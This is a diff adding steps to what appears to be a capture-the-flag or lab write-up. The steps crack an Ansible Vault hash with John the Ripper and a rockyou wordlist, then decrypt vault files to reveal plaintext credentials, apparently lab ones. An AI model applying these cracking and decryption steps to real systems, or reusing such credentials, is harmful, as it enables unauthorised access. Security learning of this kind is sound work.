@@ -359,6 +359,30 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
                          
 ```
+
+```
+ john admin_login.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 10000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!@#$%^&*         (admin_login.txt)     
+1g 0:00:00:07 DONE (2026-10-10 11:10) 0.1269g/s 5051p/s 5051c/s 5051C/s 051790..victor2
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+```
+ansible-vault decrypt admin_login.txt --vault-password-file=<(echo '!@#$%^&*') --output=-
+ansible-vault decrypt admin_pass.txt --vault-password-file=<(echo '!@#$%^&*') --output=-
+ansible-vault decrypt ldap.txt --vault-password-file=<(echo '!@#$%^&*') --output=-
+Decryption successful
+svc_pwmDecryption successful
+pWm_@dm!N_!23Decryption successful
+DevT3st@123     
+```
 ---
 ## Foothold
 
